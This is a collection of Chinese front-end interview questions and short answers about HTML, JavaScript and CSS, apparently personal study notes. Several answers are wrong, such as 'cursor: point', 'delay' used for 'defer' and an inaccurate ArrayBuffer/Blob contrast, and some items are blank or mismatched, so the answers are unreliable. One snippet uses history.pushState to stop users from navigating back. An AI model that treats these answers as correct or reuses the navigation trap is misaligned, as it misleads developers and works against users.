html题目（50）

# 1、说说元素上下层叠关系及七阶层叠关系

正 z-index > z-index：auto or 0 > display：inline > float：浮动盒子 > block 块状水平盒子 > -z-index > 层叠上下文 background/border

# 2、实现九宫格布局

html

# 3、你有使用过IE的条件注释吗？

IE条件注释主要用于加载兼容低版本IE的脚本

# 4、当网页放大或者缩小后如何让页面布局不乱？

采用rem流式布局

# 5、如何使用普通元素拥有像textarea元素一样缩放？

contenteditable
resize:both;

# 6、在网格布局中都有哪些概念呢？比如：网格线

    容器：采用网格布局的区域
    项目：容器内部采用网格定位的子元素
    行：容器里面的水平区域
    列：容器里面的垂直区域
    单元格：行和列的交叉区域
    网格线：划分网格的线

# 7、如何让`<p>测试 空格</p>`这两个词之间的空格变大？

html

letter-spacing和word-spacing这两个属性都用来添加他们对应的元素中的空白。
letter-spacing添加字母之间的空白，而word-spacing添加每个单词之间的空白。
word-spacing对中文无效

# 8、怎样在文本框中禁用中文输入法？

css
ime-mode: disabled

正则校验
/^[\u2E80-\u9FFF]+$/

# 9、说说html5手势检测原理是什么？

手势检测的关键是用 touchstart，touchmove，touchend 三个事件对手势进行分解

# 10、举例说明原生的html组件有哪些？

<dialog>
<progress>
<video>
<template>

# 11、使用history路由方式时，你有自己动手配置过服务器端吗？为什么要配服务器端？怎么配？

hash 只在当前URL内刷新，history支持多个URL

history要请求服务器
hash不请求服务器

# 12、使用history路由方式时，你有自己动手配置过服务器端吗？为什么要配服务器端？怎么配？

history路由会请求服务器，因此需要服务器配合返回一个固定的index.html页面

以nginx配置为例：

location / {
  try_files $uri $uri/ /index.html;
}

以上面的 http://www.example.com/post 为例，$uri 会匹配到 post，nginx 发现 dist 目录下下面没有 post 这个文件，也没有 post 这个文件夹，所以最后会返回 dist 目录下的 index.html。这样，index.html 被浏览器加载之后，前端路由就会工作，将用户需要的资源加载出来。而我们 build 出来的 css，js 文件，由于可以被 nginx 正确找到，则不会受到影响。

# 13、html5的Notification桌面通知如何请求权限？

Notification.requestPermission(callback);

# 14、html5的游戏引擎你了解多少？都有哪些比较好用的引擎呢？

最近接了个小项目
接触了一个游戏引擎 Phaser 主攻2D
Phaser用的别家的内核把 自己加壳子

其他的只是看过介绍

# 15、请说说input的inputmode属性有什么应用场景？

inputmode 全局属性 是一个枚举属性，它提供了用户在编辑元素或其内容时可能输入的数据类型的提示。它可以是以下值：

"none"
无虚拟键盘。在应用程序或者站点需要实现自己的键盘输入控件时很有用。
"text"
使用用户本地区域设置的标准文本输入键盘。
"decimal"
小数输入键盘，包含数字和分隔符（通常是“ . ”或者“ , ”），设备可能也可能不显示减号键。
"numeric"
数字输入键盘，所需要的就是0到9的数字，设备可能也可能不显示减号键。
"tel"
电话输入键盘，包含0到9的数字、星号（*）和井号（#）键。表单输入里面的电话输入通常应该使用 <input type="tel"> 。
"search"
为搜索输入优化的虚拟键盘，比如，返回键可能被重新标记为“搜索”，也可能还有其他的优化。
"email"
为邮件地址输入优化的虚拟键盘，通常包含"@"符号和其他优化。表单里面的邮件地址输入应该使用 <input type="email"> 。
"url"
为网址输入优化的虚拟键盘，比如，“/”键会更加明显、历史记录访问等。表单里面的网址输入通常应该使用 <input type="url"> 。
如果没有设置这个属性，它的默认值是 "text"，表明使用本地的标准文本输入键盘。

# 16、举例说明图片懒加载的方案有哪些？

    利用 getBoundingClientRect() 这个 API 获取图片元素相对于视口的位置，来判断是否需要加载图片

    利用 IntersectionObserverEntry接口 获取目标元素与容器的相交状态

# 17、浏览器是如何解析html的？

获得html文件后，浏览器的内核中负责HTML解析、布局、渲染的引擎就会开始工作。

# 18、html如何启动本地的exe应用？

一般采用自定义浏览器协议的方式实现,可跨平台.
需要exe配合,修改目标机器的注册表.
如果要检测客户端是否已经安装对应的程序,可配合custom-protocol-detection这个项目.

# 19、如何实现前端代码实时预览效果？

websocket

# 20、你有使用过time标签吗？说说它的用途有哪些？

首先time标签是h5的新属性，标签定义为公历的时间或日期。
好处是time约束的日期或时间的编码方式满足机器可读的要求。

# 21、你有使用过blockquote标签吗？说说它的用途有哪些？

用于标记长的引用
浏览器在 blockquote 元素前后添加了换行，并增加了外边距。

# 22、你有使用过meter标签吗？说说它的用途有哪些？

<meter> 标签定义已知范围或分数值内的标量测量。也被称为 gauge（尺度）。

# 23、你有使用过template标签吗？说说它的用途有哪些？

HTML内容模板（<template>）元素是一种用于保存客户端内容机制，该内容在加载页面时不会呈现，但随后可以(原文为 maybe)在运行时使用JavaScript实例化。

将模板视为一个可存储在文档中以便后续使用的内容片段。虽然解析器在加载页面时确实会处理<template>元素的内容，但这样做只是为了确保这些内容有效；但元素内容不会被渲染

# 24、如何使用纯html制作一个进度条？

<progress value="70" max="100">70 %</progress>

HTML中的progress () 元素用来显示一项任务的完成进度.虽然规范中没有规定该元素具体如何显示,浏览器开发商可以自己决定,但通常情况下,该元素都显示为一个进度条形式.

# 25、你有使用过output标签吗？说说它的用途有哪些？

执行计算然后在 元素中显示结果

<input value="i"> </input> + <input value="j"> </input> = <output xx="i + j"></output>

# 26、DOM节点的根节点是不是body？

根节点是HTML

文档对象模型 (DOM) 是HTML和XML文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。简言之，它会将web页面和脚本或程序语言连接起来。在文档中的每个元素— 包括整个文档，文档头部， 文档中的表格，表头，表格中的文本 — 都是文档所属于的文档对象模型（DOM）的一部分，因此它们可以使用DOM和一个脚本语言如 JavaScript，来访问和处理。
文档对象模型（DOM）提供了对同一份文档的另一种表现，存储和操作的方式。 DOM是web页面的完全的面向对象表述，它能够使用如 JavaScript等脚本语言进行修改。
DOM的根节点是document对象，即html标签。

# 27、DOM节点的种类有哪些？

可以用node.nodeType来获取节点类型

element_node  元素类型
text_node  文本类型
cdata_section_node
processing_instruction_node
comment_node
document_node  document类型
document_type_node  doctype类型
document_fragment_node  documentfragment类型

# 28、如何扩大CheckBox点击区域

用 label 包裹，扩大 label 尺寸

# 29、如何在网页中嵌入公司地址的地图？

<script src='http://api.map.baidu.com/api?v=2.0&ak=BG9Wtw7egUbIQHPjG9ayOLQO'>
</script>

<script> 
(function(){ 
  var map = new BMap.Map("container");
  //设置底图 map.centerAndZoom("深圳", 18);
  //初始化地址，查询的地址所在市 map.enableScrollWheelZoom();
  //启用滚轮放大缩小，默认禁用 map.enableContinuousZoom();
  //启用地图惯性拖拽，默认禁用

  var localSearch = new BMap.LocalSearch(map);
  localSearch.enableAutoViewport(); //允许自动调节窗体大小

  function searchByStationName() {
    map.clearOverlays();//清空原来的标注
    var keyword = "深圳市罗湖区红桂路2068号红桂大厦一楼";//查询的详细地址
    localSearch.setSearchCompleteCallback(function (searchResult) {
    var poi = searchResult.getPoi(0);
    map.centerAndZoom(poi.point, 18);
    var marker = new BMap.Marker(new BMap.Point(poi.point.lng, poi.point.lat)); // 创建标注，为要查询的地方对应的经纬度
    map.addOverlay(marker);
    var content = keyword;
    var infoWindow = new BMap.InfoWindow("

    " + content + "
    ");
    marker.addEventListener("click", function () { this.openInfoWindow(infoWindow); });
    marker.setAnimation(BMAP_ANIMATION_BOUNCE); //跳动的动画
    });
    localSearch.search(keyword);
    }
    searchByStationName();
}())
</script>

todo


# 30、如何在网页中打开腾讯QQ？

window.open('http://wpa.qq.com/msgrd?v=3&uin=1186&site=qq&menu=yes')


# 31、页面布局时你使用最多的标签是什么？div吗？在什么情况下会使用到div？

整体布局用<header> <main> <aside> <footer>
细分布局用 <div>

# 32、怎样在`<pre>`标签内不转义<和>符号（原样输出html标签）？

空格不行

# 33、pre与xmp标签有什么区别？

xmp的标签，会复把抱在内部的html片段当作字符串输出（此标签已废弃）
<pre></pre> 标签，可以在保留原来文本格式的基础制上让文本在页面上显示出来
<pre> 标签中的特殊符号被转换为符号实体，比如 "&lt;" 代表 "<"，"&gt;" 代表 ">"。

xmp
<xmp> <div>xmp</div> </xmp>
//输出
<div>xmp</div>

pre
<pre> <strong>pre</strong> </pre>
//输出
加粗的pre

# 34、网页打印与标准纸张换算时，cm和px是如何换算的？

(function(){
  // 创建一个1cm宽的元素插入到页面，然后坐等出结果
  let div = document.createElement("div");
  div.id = "cm";
  div.style.width = "1cm";
  document.querySelector("body").appendChild(div);
  // 原生方法获取浏览器对元素的计算值
  let cm1 = document.getElementById("cm").getBoundingClientRect();
  console.log(cm1);
  return cm1.width;
})()

1cm = 37.7890625

# 35、你有使用过html5的rt标签吗？它有什么应用场景？

<ruby>
  汉 <rt>Hàn</rt>
  字 <rt>Zì</rt>
</ruby>

# 36、html5的video如何附带字幕？

<video controls width="400" height="300">
  <source src="../hangge.mp4" type="video/mp4">
  <track src="hangge.vtt" srclang="zh" kind="subtitles" label="中文" default>
  <track src="hangge_en.vtt" srclang="en" kind="subtitles" label="English">
</video>

# 37、html中如何使用svg？

https://github.com/haizlin/fe-interview/issues/2456

# 38、你有使用过webp的图片格式吗？

https://github.com/haizlin/fe-interview/issues/2460

# 39、webp与jpg、png比较，它有什么优劣势？如何选择？

优：

  更优的图像压缩算法，更小的图片体积

  肉眼识别无差异的图片质量

  支持有损无损压缩

  支持动画，透明

  色彩丰富的 24-bit 颜色数

劣：

  存在兼容性问题

选择：

  当 图片较少 体积不大 且存在兼容性问题时，兼容性方法处理起来较复杂，可以选择传统模式

  当 图片较多 且不存在兼容性问题或者兼容性方法处理起来比较简单时，使用webp格式

兼容性处理：

1.通过picture标签进行选择判断

<picture>
    <source srcset="img/pic.webp" type="image/webp">
    <source srcset="img/pic.jpg" type="image/jpeg">
    <img src="img/pic.jpg">
</picture>

该种方法要求在每个要请求webp图片的标签下都要通过picture标签来进行兼容性处理，
同时注意该标签在IE的兼容性并不是很好，不过已经比webp的兼容性好一些。


2.通过服务端判断请求头中的Accept的值判断是否支持webp

通过HTTP request header中是否存在Accept: image/webp来判断，
这种方法的缺点在于：很多时候我们的图片等静态资源都会放到CDN服务器上，在这个层面加上判断webp的逻辑会更麻烦一些

3、由浏览器端判断是否支持WebP格式

if(document.createElement('canvas').toDataURL('image/webp').indexOf('data:image/webp') == 0){
   //  该浏览器支持WebP格式的图片
}

该种方法的原理为：

HTMLCanvasElement.toDataURL() 方法返回一个包含图片展示的 data URI 。可以使用 type 参数其类型，默认为 PNG 格式。

1.如果画布的高度或宽度是0，那么会返回字符串“data:,”。

2.如果传入的类型非“image/png”，但是返回的值以“data:image/png”开头，说明该传入的类型是不支持的。

3.Chrome支持“image/webp”类型。

# 40、如何让table的边框双线变单线？

border-collapse：属性，为表格设置合并边框模型。

# 41、input如何在各个浏览器下保持UI统一？

reset样式

# 42、浏览器是怎么对HTML5的离线储存资源进行管理和加载的


    在线的情况下，浏览器发现html头部有manifest属性，它会请求manifest文件，如果是第一次访问app，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过app并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的manifest文件与旧的manifest文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。
    离线的情况下，浏览器就直接使用离线存储的资源。


# 43、说说你对Media Source Extensions(MSE)的理解，它解决了什么问题呢？

Media Source Extensions 允许JavaScript动态地为<audio>和<video>创建媒体流，而不再只能是引用一个视频文件的url。这样就极大地丰富了前端对音视频的处理能力，也赋予了其更多灵活性。

# 44、切页面时，每次都动手刷新看效果很麻烦，如果要让你写一个实时刷新预览的工具你该怎么写？


    node包http, scoket.io建立服务
    静态页面增加webSocket，服务器推送后执行刷新页面
    fs包，fs.watch 监听静态页面，文件变更后推送消息

或者 直接使用browser-sync

# *45、图片上传时实现本地预览功能的原理是什么？

通过HTML5 File API读取用户上传的图片，生成一个image对象显示到页面

# 46、websocket和http有什么区别？

WebSocket是双向的，在客户端-服务器通信的场景中使用的全双工协议，与HTTP不同，它以ws://或wss://开头。
HTTP是单向的，客户端发送请求，服务器发送响应。

# 47、websocket和socket有什么区别？ 

1.Socket 是传输控制层的接口。用户可以通过 Socket 来操作底层 TCP/IP 协议族通信。
2.WebSocket 是一个完整应用层协议。
3.Socket 更灵活，WebSocket 更易用。
4.两者都能做即时通讯

# 48、websocket是如何做心跳检测、数据加密、身份验证的？

# 49、http和websocket能共用一个端口吗？为什么？

# 50、websocket握手阶段是通过什么协议传输的？

HTTP


js题目（50）

# 1、说说防止重复发送ajax请求的方法有哪些？各自有什么优缺点？

    防抖法：在一段时间内重复请求，则取消本次请求
    节流法：在一段时间内只能请求一次，下次请求必须在前一次请求完成后
    等值法:未完成请求状态不再请求，而是完成后直接返回相同的内容

# 2、写一个方法判断数组内元素是否全部相同

const isSameArray = function (array) {
  if (Array.isArray(array)) {
    return new Set(array).size === 1;
  }

  return false;
};

去重

# 3、for in 和 for of 的区别？

for in 用于循环对象上可枚举的属性；（最好不要用于数组）
for of 用于循环具有iterate接口的对象，如：数组、字符串、arguments、标签、日期对象、时间对象等；

# 4、写一个方法实现promise失败后自动重试

Promise.retry = (fun, limit = 5) => {
    return new Promise((resolve, reject) => {
        let _num = 1;
        let _run = () => {
          fun()
          .then(res => {
            resolve(res);
          })
          .catch(err => {
            if(_num++ >= limit){
              reject(err)
            } else {
                console.log('retry again')
                _run()
            }
          })
        }
        _run()
    })
}

let k = 0;
function test() {
    return new promise((resolve, reject) => {
        if(++k >= 3) {
          resolve(k)
        } else {
          reject('hhh')
        }
    })
}

# 5、ajax请求地址只支持http/https吗？能做到让它支持rtmp://等其它自定义协议吗？

ajax只支持http/https协议，
可以通过自定义http头来间接支持自定义协议

# 6、举例说明js立即执行函数的写法有哪些？

(function() {

})()

(function() {

}())

!(function(){

})()

!(()=>{

})()

# 7、如何避免JS浮点运算的精度问题（例：0.1+0.7=0.7999999999999999）

可以利用Number.toLocaleString，默认最多保留3位有效小数

+(0.1 + 0.7).toLocaleString() // 0.8
+(0.1 + 0.2).toLocaleString() // 0.3

(0.1 + 0.7).toLocaleString() => '0.8'

+'0.8' = 0.8

# 8、ReferenceError和TypeError有什么区别？

访问一个 未定义的变量 ReferenceError 

TypeError 类型出错。

# 9、一道变态题 Number.call.call(Number, undefined, 0) 等于什么？

Number.call(Number, undefined, 0) 等于什么？
Number.call.call(Number, undefined, 0) 等于什么？

Number.call(Number, undefined, 0)
= Number(undefined, 0)

Number.call.call(Number, undefined, 0) 
=  Number.call(undefined, 0)
=  Number.call(0)

# 10、获取浏览器当前页面的滚动条高度的兼容写法

document.documentElement.scrollTop || document.body.scrollTop;

# 11、js中的 undefined 和 ReferenceError: xxx is not defined 有什么区别？

console // xxx is not defined 
let a;


console // undefined
var a;

# 12、请使用js实现商品的sku，并说说你的思路

https://github.com/haizlin/fe-interview/issues/2598

# 13、请使用js实现vue的diff算法

todo：https://github.com/haizlin/fe-interview/issues/2602

# 14、写一个单向链数据结构的 js 实现并标注复杂度

https://github.com/haizlin/fe-interview/issues/2606

# 15、用函数实现扑克牌排序

https://github.com/haizlin/fe-interview/issues/2610

# 16、模拟 localStorage 时如何实现过期时间功能

https://github.com/haizlin/fe-interview/issues/2614

# 17、请使用js实现一个秒表计时器的程序

https://github.com/haizlin/fe-interview/issues/2618

# 18、你用过Navigator.sendBeacon()吗？说说它有什么应用场景？

这个方法主要用于满足统计和诊断代码的需要，这些代码通常尝试在卸载（unload）文档之前向web服务器发送数据。

navigator.sendBeacon() 方法可用于通过 HTTP POST 将少量数据异步传输到 Web 服务器。

# 19、给你一个页面，找出该页面使用最多的前三个标签以及他们的数量


const tagSet = Array.from(document.querySelectorAll('*'))
    .map(item => item.tagName)
    .reduce((res, item) => {
        if (res[item]) {
            res[item] = res[item] + 1;
        } else {
            res[item] = 1;
        }
        return res;
    }, {});


 const res = Object.keys(tagSet).map(item => ({
        key: item,
        value: tagSet[item]
    })).sort((a, b) => b.value - a.value)
   
   
console.log(res);

# 20、前端如何保持与服务器时间同步（如何解决客户端与服务端时间不对称的问题）？

1.客户端直接请求并使用服务端时间作为初始时间
2.在客户端每隔一秒自动为初始时间增加一秒

# 21、当用户打开一个网页时，想一直停留在当前打开的页面，如何禁止页面前进和后退

没有历史记录就不会前进后退
window.history.forward(-1);

此需求很不人性化
如果必须实现. 使用 history.pushState 并 监听 popstate 事件. 使历史记录最顶层永远是当前 url

  var url = document.URL;
  history.pushState({
    url
  }, '', url);

  window.onpopstate = function (event) {
    history.pushState({
      url
    }, '', url);
  };

# 22、js延迟加载的方式中，只有IE浏览器支持的是哪一种方式

动态创建script标签，监听onreadystatechange

# 23、你能用js模拟出右键的复制和粘贴功能吗？如果可以说下是如何操作的？如果不可以请说明下理由

可以

1、监听onContextmenu,用户单击右键的时候，屏蔽系统菜单，显示自定义的右击菜单
2、监听复制粘贴按钮的单击事件

# 24、async属性诞生的初衷是什么？

为了并行加载脚本文件---------该脚本不依赖于dom，也不依赖于其它脚本，加载完成立即执行

# 25、解释下隐式全局变量和外部函数作用域

隐式全局变量是不需要声明即可以在任何地方直接使用的变量，如浏览器端的window, node端的global
当函数内包括函数时（闭包），外层函数相对于内层函数的作用域即外部函数作用域

# 26、sessionStrorage也可以使用onstorage事件吗?

onStorage的事件意思是：
https://developer.mozilla.org/zh-CN/docs/Web/API/WindowEventHandlers/onstorage

支持

# 27、使用window.open(url)下载文件时为什么会被浏览器拦截？如何解决？

如果浏览器发现window.open下载文件不是由用户触发，则会拦截
解决方案，二选一：
1.将window.open放在按钮的单击事件中执行
2.动态创建一个a标签，设置url 和 target,执行click,最后移除


# 28、前端下载文件的方式有哪些？

1、a标签download属性和href属性
<a download="imgName" href="./img/1.jpg">
2、open方法
window.open("./img/1.jpg")
3、表单提交
form.submit()

# 29、为什么jsonp不支持post的方法？

jsonp是跨域解决方案的其中一种方式，依赖script来突破同源策略的限制，而script是通过get方式拉取资源的。

# 30、使用try catch哪些异常是捕获不到的？哪些能捕获到？捕获不到的要怎样才能捕获到？

websocket 连接失败时，无法用try...catch...捕捉

# 31、使用canvas画一个小球自由落体的效果

todo

# 32、下文Promise的执行顺序是怎样的？

// 故函数打印顺序为 1->2->3->4->8->5->9->11->6->10->12->7

// 第二行Promise被创建后自动运行，打印 "1" ，后续执行resolve进入第五行箭头函数
// 第六行打印 "2" ，后续创建新Promise对象
// 第七行Promise被创建后立即执行，代码进入第八行，打印 "3" ，后续执行resovle进入第十一行箭头函数
// 第十二行打印 "4" 完成，没有resolve强制执行下个任务进入同步任务队列，回过头来执行第一个Promise的then函数
// 第二十五行箭头函数执行，打印 "8" ,继而执行Promise.resolve，强行插队回到第二个Promise的第二个then十三行中（第一个then被强制resolve）
// 第十四行箭头函数执行，打印 "5" ，回到原始队列，继续执行第一个Promise，代码进入二十八行
// 第二十九行箭头函数执行，打印 "9",第二十四行到三十四行内为第一个Promise的一个then行为，没有resolve，下个任务继而计入同步队列，执行三十五行的下一个then
// 第三十六行箭头函数执行，打印 "11" ，进行下一个异步前需要清空同步队列，现在在同步队列中的任务有第十六行和第二十四行
// 根据同步队列顺序，第十六行then方法先执行，执行十七行箭头函数，打印 "6" ，然后没有resolve强制执行下个任务进入同步队列
// 继续根据同步队列顺序第二十四行then继续执行，前部分已完成，直接进入第三十一行，第三十二行执行箭头函数，打印 "10" ,该同步队列清空，继续下一个异步
// 第三十九行箭头函数执行，打印 "12"，进行下一个异步前摇清空同步队列，同步队列中还剩十九行
// 根据同步队列顺序，第二十行箭头函数执行，打印 "7"，同步队列完成清空
// 进入下一个异步，Promise闭合，异步队列完成清空，函数执行完毕

new Promise((resolve,reject)=>{
    console.log("1") // 第二行Promise被创建后自动运行，打印 "1" ，后续执行resolve进入第五行箭头函数
    resolve()
}).then(()=>{
    console.log("2") // 第六行打印 "2" ，后续创建新Promise对象
    new Promise((resolve,reject)=>{
        console.log("3") // 第七行Promise被创建后立即执行，代码进入第八行，打印 "3" 
        resolve()
    }).then(()=>{
        console.log("4") 第十二行打印 "4" 
    }).then(()=>{
        console.log("5") 
    }).then(()=>{
        console.log("6")
    }).then(()=>{
        console.log("7")
    })
}).then(()=>{
    console.log("8") // 第一个promise后打印 "8"
    Promise.resolve().then(()=>{
        console.log(9)
    }).then(()=>{
        console.log(10)
    })
}).then(()=>{
    console.log("11")
}).then(()=>{
    console.log("12")
})


# 33、说说MutationObserver的应用场景有哪些？

https://github.com/haizlin/fe-interview/issues/2710

# 34、getComputedStyle和element.style有什么不同？

element.style 只能获取内联样式属性
getComputedStyle() 可以获取所有样式属性

# 35、使用js写一个方法生成0000-9999一万个数字（4位数）

Array.from({ length: 10000 }, (_, i) => `${i}`.padStart(4, 0));

# 36、动态加载的li如何绑定事件？

var item1 = document.getElementById("id1");
var item2 = document.getElementById("id2");
var item3 = document.getElementById("id3");

document.addEventListener("click", function (event) {
  var target = event.target;
  switch (target.id) {
    case "id1":
      document.title = "事件委托";
      break;
    case "id2":
      location.href = "github.com";
      break;
    case "id3": alert("hi");
      break;
  }
})

ul.addEventListener('click', function (e) {
var target = e.target
if (target.tagName.toLowerCase() === "li") {
console.log('事件处理')
}
})

# 37、ArrayBuffer和Blob有什么区别？

ArrayBuffer 只读,Blob 可写

Blob 用于操作二进制文件
ArrayBuffer 用于操作内存

# 38、Array(3)和Array(3, 4)的区别是什么？

console.log(Array(3))
console.log(Array(3, 4))

console.log(new Array(3))
console.log(new Array(3, 4))

console.log(Array.of(3))
console.log(Array.of(3, 4))


Array和new Array的执行结果一样
Array.of(3) => [3] 创建一个具有可变数量参数的新数组实例，而不考虑参数的数量或类型。

# 39、随机生成一个指定长度的验证码

默认长度为10，同是可以指定长度
该验证码同时包含数字、大写字母、小写字母、特殊字符

function randomCode(len) {
    const allStr = 'azxcvbnmsdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP0123456789.*&^%$#@!~';
    let code = '';
    for (let index = 0; index < len; index++) {
        code += allStr.charAt(Math.floor(Math.random() * 72));
    }
    return code;
}
randomCode(5)
"zu%I8"

# 40、浏览器中window.length的结果是什么？为什么？

0 

因为window.length表示当前页面中存在的frame或者iframe的数量，不存在就是0。

# 41、你有用过哪些模板引擎？你觉得哪个好用？为什么？


    dot.js art-templete ejs

# 42、cookie的值可以设置为中文吗？为什么？如果可以怎么设置？

可以,需要注意转码问题

# 43、什么情况下会出现js阻塞？


    未在script 使用 async delay 属性且不是body的最后一个标签
    ajax 使用了同步

# 44、怎样做到js无阻塞加载？

    js 资源放在最后
    script标签属性 delay async

# 45、写一个方法，当复制页面中的内容时，同时把版权信息也复制上

https://github.com/haizlin/fe-interview/issues/2771

# 46、在多个页面之间需要传递参数，你是如何传递这些参数的？

localstorage session cookie url参数

使用HTML5新增的postMessage方法

# 47、写一个方法对对象中的key进行排序

Object.prototype.sortedKeys = function() {
    const thisKeys = []
    for (const key in this) {
        if (Object.prototype.hasOwnProperty.call(this, key)) {
            thisKeys.push(key)
        }
    }
    thisKeys.sort()
    return thisKeys
}

a = {name: 'name', aName: 'aname', zName: 'zname'}
a.sortedKeys()
// ["aName", "name", "zName"]

# 48、使用js写一个多文件上传的组件

https://www.cnblogs.com/chengpanpan/p/7074794.html

# 49、如何取消promise？

Promise/A+标准规定了：原Promise对象跟新返回的对象状态一致。所以可以通过返回一个始终是pending状态的Promise对象来取消Promise。

【所以可以通过返回一个始终是pending状态的Promise对象来取消Promise。】

Promise.resolve().then(() => {
  console.log(1)
  return new Promise(()=>{}) // 返回“pending”状态的Promise对象
}).then(() => {
  // 后续的函数不会被调用
  console.log(2)
}).catch(err => {
  console.log(err)
}) // 只输出1

# 50、写一个方法，计算有N个数（可重复），分别放到M个位置中，有多少种排列？

https://github.com/haizlin/fe-interview/issues/2796


css题目（50）

# 1、如何让IE6支持min-width和max-width？

利用IE特有的css语法 

.className {
    max-width:620px;
    min-width:1px;
    _width:expression(this.scrollWidth > 620 ? "620px":(this.scrollWidth < 1? "1px":"auto"));
}

# 2、如何解决IE6浮动时产生双倍边距的BUG？



 1.当块级元素有浮动样式的时候，给元素添加margin-left和margin-right样式，在ie6下就会出现双倍边距
 2.给当前元素添加样式，使当前元素不为块，如：display:inline;display:list-item 这样在元素浮动的时候就不会在ie6下面产生双倍边距的问题了

# 3、 你知道什么是面向对象的css（oocss）吗？有没有实践过？

oocss(Object Oriented CSS)不是一种技术也不是一种语言，它是一种css的书写方法，其核心是用最简单的方式编写最整洁的css代码，使代码更具重用性、可维护性和可拓展性。
OOCSS的两条主要准则：
1.结构和皮肤分离;
2.容器和内容分离;

比如一些常用的字体大小、padding、margin值等可以封装为公共样式，html中引用多个类似的类名达到UI效果，减少特性css的代码量
.text-12{ font-size: 12px; } .text-14{ font-size: 14px; } .text-16{ font-size: 16px; }

# 4、OOCSS有哪些好处？对应的库有哪些？

有语义的类名，逻辑性强的层次关系
可重用，样式和结构的分离，容器和内容的分离
Kite

# 5、flex布局的缺点有哪些？（除兼容性外）

  无法直接定义列数(要使用百分比的方式实现)
  item 如果有多行的话，grid 要比 flex 方便

# 6、CSS中哪些属性会引起GPU渲染，会增加耗电吗？

transform

opacity

filter

will-change

# 7、如何在白天和黑夜自动切换页面的颜色？

@media (prefers-color-scheme: dark)

媒体查询的内容都是设备的属性：宽度高度，旋转方向，打印样式，分辨率
借助 js 切换页面颜色的话，那就是

    获取地理位置
    查询日出日落时间
    根据时间修改全局 theme

# 8、如何给文字的color设置渐变

html

# 9、为什么说css中能用子代选择器的时候不要用后代选择器？

> 作用于元素的第一代后代，空格作用于元素的所有后代

子代选择器：
h1 > strong {color:red;}

后代选择器：
h1 元素中的 em 元素应用样式
h1 em {color:red;}

选择从右到左依次解析匹配，所以后代选择器会去找它的所有父级，
而子代选择器只会选择直接的父级；减少匹配次数，提高效率

# 10、你有没有使用过“形似猫头鹰”（例：* + *{ ... }） 的选择器？

表示和当前li同级的所有li标签。不包括父级li和子级li。

li + li {
  margin-top: 1rem;
}

==>

li:not(:first-of-type) {
  margin-top: 1rem;
}

# 11、用css画一个五边形和一个六边形

五边形：clip-path: polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);

六边形：clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);

七边形：clip-path: polygon(50% 0%, 90% 20%, 100% 60%, 75% 100%, 25% 100%, 0% 60%, 10% 20%);

clip-path 

# 12、使用纯css来创建一个滑块

https://github.com/haizlin/fe-interview/issues/1982

# 13、使用css3实现一个斑马线的效果

水平
{
  background: linear-gradient(#fb3 33.3%, #58a 0, #58a 66.6%, yellowgreen 0);
  background-size: 100% 45px;
}

<!-- 方向，开始颜色、开始位置，结束颜色、结束位置 -->

垂直 
{
  background: linear-gradient(to right, #fb3 50%, #58a 0);
  background-size: 100% 45px;
}

45度斜条纹
{
  background: linear-gradient(45deg, #fb3 50%, #58a 0);
  background-size: 45px 45px;
}

{
  background: linear-gradient(45deg, #fb3 50%, #58a 0);
  background-size: 45px 45px;
}

更好的斜条纹：

{
  background: repeating-linear-gradient(45deg, #fb3 50%, #58a 0);
}

{
  background: repeating-linear-gradient(45deg, #fb3 50%, #58a 0);
  background-size: 45px 45px;
}

同色条纹
{
  background: #58a;
  background-image: repeating-linear-gradient(30deg,
    hsla(0,0%,100%,1),
    hsla(0,0%,100%,1) 15px,
    transparent 0, transparent 30px
  );
}


# 14、如何使用css实现跨浏览器的最小高度？

todo

# 15、怎么设置可点击的元素上强制手型？

cursor: point

# 16、使用css实现悬浮提示文本

html

# 17、如何禁用移动的选择高亮？

user-select: none;

tap-highlight-color: rgba(0,0,0,0);

tap-highlight-color: transparent;

# 18、颜色hsla的字母分别表示什么？

hsla: 不透明度

h：色度
s：饱和度
l：亮度
a：透明度

# 19、说说你对table-layout的理解，它有什么运用场景？

table-layout的值为 fixed的时候，单元格的宽度只与表格，单元格的宽度有关，与内容无关

table-layout的值为 auto的时候，单元格的宽度为当前列最长行有的宽度来计算

如果想要一个table固定大小，里面的文字强制换行，以达到过长文字不撑破表格的目的，一般用table-layout：fixed

# 20、怎么使用css选择空链接？

html

# 21、如何隐藏没有静音、自动播放的音视频？

- 浏览器已经禁止打开网页时自动播放，可以用iframe 先播放触发播放权限，然后再播放
- opacity: 0

# 22、使用css实现对话气泡的效果

长方椭圆 + 三角型

:after{ 
  content: '',
  width: 0;
  height: 0;
  margin: 100px auto;
  border-top: 50px solid transparent;
  border-left: 50px solid transparent;
  border-right: 50px solid transparent;
  border-bottom: 50px solid red;  border-bottom: trantent ;
}

# 23、你有使用过css的writing-mode属性吗？说说它有哪些应用场景？

用过，该属性可以使文字竖直排列，比如在网页上展示春联

horizontal-tb 水平

vertical-rl 垂直

# 24、css中Scroll-behavior属性有什么应用场景？

手动锚点或者调用api进行页面滚动的时候，Scroll-behavior属性可以为滚动框设定滚动行为，
auto 表示要立即滚动到指定位置， smooth则表示要平滑过渡，

# 25、scroll-snap-align属性的应用场景是什么？

这个属性设置后，会一个块被滚了一部分中途松手了之后，页面自动滚回去或者滚到下一个块

使用：

ul {
  scroll-snap-type: y mandatory;
}

li {
  scroll-snap-align: start; // end center
}


# 26、如何用css实现把“我不爱996”变成“699爱不我”？

direction: rtl;
unicode-bidi:bidi-override;

# 27、举例说明你对指针事件（pointer-events）的理解

pointer-events css属性指定在什么情况下，某个特定的图形元素可以成为鼠标事件的target
当 pointer-events 为 none 时，比如 a 链接不再生效；

# 28、鼠标事件css的:hover和js的mouseover有什么区别？


    :hover为CSS伪类，mousehover为JS DOM事件。

    CSS只能改变元素样式，JS既可以改变元素样式又可以改变元素中的内容。

    :hover当鼠标移出后恢复之前的样式，mouseover需要结合mouseout才能恢复之前的样式

    同等效果下，从性能上讲，:hover优于mousehover

    水平有限只能想到这些，希望能抛砖引玉，向大牛们多多学习


